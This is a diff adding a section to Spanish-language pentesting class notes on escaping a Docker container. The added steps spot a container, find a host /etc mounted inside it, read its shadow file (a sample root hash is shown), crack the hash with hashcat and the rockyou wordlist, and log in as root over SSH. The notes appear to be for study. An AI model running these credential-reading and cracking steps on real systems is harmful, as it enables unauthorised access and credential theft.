@@ -18,9 +18,52 @@ Las técnicas que se tratarán en esta clase incluyen:
 ❯ hostname     # Muestra un nombre raro 
 ❯ ip a show    # Muestra eth0 como una IP que no sea la que se ataca desde un inicio 
 ❯ ls -la /     # Encontrar .dockerenv en la raiz
+❯ cata /proc/1/cgroup  # Si el resultado es igual a 0::/ entonces si es un contenedor 
 ```
 
 Estando dentro de un contenedor Docker vamos a poder escalar privilegios 'escapando' del contenedor. 
+
+## Salir del contenedor (Común)
+```bash 
+# Se debe ser root (UID 0)
+❯ mount    # Validar si existe algo montado a nivel de disco 
+
+# Comportamiento normal en Docker 
+	/dev/nvme0n1p1 on /etc/resolv.conf type ext4 (rw,relatime,...)
+	/dev/nvme0n1p1 on /etc/hostname   type ext4 (rw,relatime,...)
+	/dev/nvme0n1p1 on /etc/hosts      type ext4 (rw,relatime,...)
+
+# Volumen custom que alguien montó explicitamente   
+	/dev/nvme0n1p1 on /host_etc type ext4 (ro,relatime,...)    <-- IMPORTANTE 
+```
+
+```bash 
+Paso 1:
+❯ ls -la /host_etc        # Mirar el contenido y ver si es una copia de un /etc real para buscar 'passwd y shadow'
+❯ cat /host_etc/shadow    # Mirar el contenido de shadow donde el usuario root tiene una password cifrada 
+
+  root:$6$J2I2B/9W$r8.DJ7Nt6QvPHbmN429Jf.DQekUUwCioArcu1nUrKDbJmAkMdUORCPiB3fwt4FPN0qfQXHfTRBS1sze.8ak.4/:20580:0:99999:7:::
+ 
+ Donde: 
+	 # $6$ = SHA-512crypt
+	 # root = Usuario 
+	 # J2I2B/9W = Salt 
+
+❯ grep -inE 'PermitRootLogin|PasswordAuthenyication|Include' /host_etc/ssh/sshd_config
+# Conocer si existe el password authentication habilitado con el PermitRootLogin y hacer la conexión por SSH 
+
+Paso 2:
+❯ echo 'root:$6$J2I2B/9W$r8.DJ7Nt6QvPHbmN429Jf.DQekUUwCioArcu1nUrKDbJmAkMdUORCPiB3fwt4FPN0qfQXHfTRBS1sze.8ak.4/' > root_hash.txt
+❯ hashcat -m 1800 -a 0 --username root_hash.txt /usr/share/wordlists/rockyou.txt 
+# Crackear el cifrado obtenido del archivo /etc/shadow 
+	# a 0 = Ataque de diccionario 
+	# username = Todo lo que esté antes del primer : es el nombre de usuario, ignóralo para el crackeo, pero muéstramelo en el output para que sepas a quién pertenece cada hash crackeado
+	# --show = Muestra la password crackeada 
+
+Paso 3:
+❯ ssh root@IP     # Conectarse por SSH a la máquina víctima con la password obtenida 
+```
+
 ### Forma 1
 
 ```bash 
